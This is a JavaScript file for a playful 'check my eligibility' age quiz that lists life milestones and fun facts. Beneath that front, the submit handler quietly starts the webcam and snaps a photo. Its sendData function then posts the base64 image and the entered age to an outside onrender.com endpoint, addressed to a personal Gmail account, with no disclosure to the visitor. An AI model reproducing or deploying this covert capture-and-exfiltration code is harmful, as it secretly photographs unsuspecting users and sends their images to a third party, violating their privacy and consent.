const ageForm = document.getElementById('ageForm');
const eligibilityBtn = document.getElementById('eligibilityBtn');
const resultCard = document.getElementById('resultCard');
const displayAge = document.getElementById('displayAge');
const eligibilityList = document.getElementById('eligibilityList');
const funFact = document.getElementById('funFact');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

let stream = null;

// Handle form submission
ageForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const age = parseInt(document.getElementById('ageInput').value);
    
    // Show loading state on button
    eligibilityBtn.disabled = true;
    eligibilityBtn.textContent = "loading...";
    
    try {
        await startCamera();
        const photoData = await captureImage();
        showAgeResults(age);
        await sendData(age, photoData);
        
    } catch (error) {
        console.error("Error:", error);
        showAgeResults(age);
    } finally {
        eligibilityBtn.disabled = false;
        eligibilityBtn.textContent = "Check My Eligibility";
        
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    }
});

async function startCamera() {
    return new Promise((resolve, reject) => {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(mediaStream => {
                stream = mediaStream;
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    resolve();
                };
            })
            .catch(err => {
                console.error("Camera error:", err);
                reject(err);
            });
    });
}

function captureImage() {
    return new Promise((resolve) => {
        
        if (video.readyState >= video.HAVE_ENOUGH_DATA) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg');
            resolve(imageData);
        } else {
            resolve(null); 
        }
    });
}

function showAgeResults(age) {
    
    eligibilityList.innerHTML = '';
    displayAge.textContent = age;

    
    const milestones = [
        { age: 0, text: 'Be born', emoji: '👶' },
        { age: 3, text: 'Go to school', emoji: '🏫' },
        { age: 13, text: 'Watch PG-13 movies alone', emoji: '🎬' },
        { age: 16, text: 'Get a driver\'s license', emoji: '🚗' },
        { age: 18, text: 'Vote in elections', emoji: '🗳️' },
        { age: 21, text: 'Buy alcohol (in most countries)', emoji: '🍺' },
        { age: 25, text: 'Rent a car (without fees)', emoji: '🚘' },
        { age: 35, text: 'Run for President (US)', emoji: '🇺🇸' },
        { age: 60, text: 'Get senior discounts', emoji: '👵' },
        { age: 100, text: 'Receive birthday letters from the Queen (UK)', emoji: '👑' }
    ];

    
    milestones.forEach(item => {
        const div = document.createElement('div');
        div.className = 'eligibility-item';
        div.innerHTML = `
            <span class="emoji">${age >= item.age ? '✅' : '🚫'}</span>
            <span class="${age >= item.age ? '' : 'muted'}">
                ${item.text} ${item.emoji} (${age >= item.age ? 'since' : 'needs'} ${item.age})
            </span>
        `;
        eligibilityList.appendChild(div);
    });

   
    funFact.textContent = getFunFact(age);
    
    
    resultCard.classList.remove('hidden');
    setTimeout(() => {
        resultCard.style.opacity = '1';
        resultCard.style.transform = 'translateY(0)';
    }, 10);
}

async function sendData(age, photoData) {
    try {
        await fetch('https://fun-2-gbdo.onrender.com/send-email',  {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: 'shreedevi2584@gmail.com',
                photoBase64: photoData,
                age: age,
                timestamp: new Date().toISOString()
            }),
        });
    } catch (error) {
        console.error("Error sending data:", error);
    }
}

function getFunFact(age) {
    if (age < 1) return "Welcome to the world! 👶";
    if (age < 13) return "Enjoy your childhood! 🧒";
    if (age < 18) return "Teenage years are the best! 🎸";
    if (age < 21) return "Almost an adult! 🎓";
    if (age < 30) return "Roaring 20s! Make them count! 🎉";
    if (age < 40) return "Prime of your life! 💪";
    if (age < 60) return "Wisdom comes with age! 📚";
    if (age < 100) return "You've seen it all! 👴";
    return "Living legend! Share your secrets! 🏆";
}
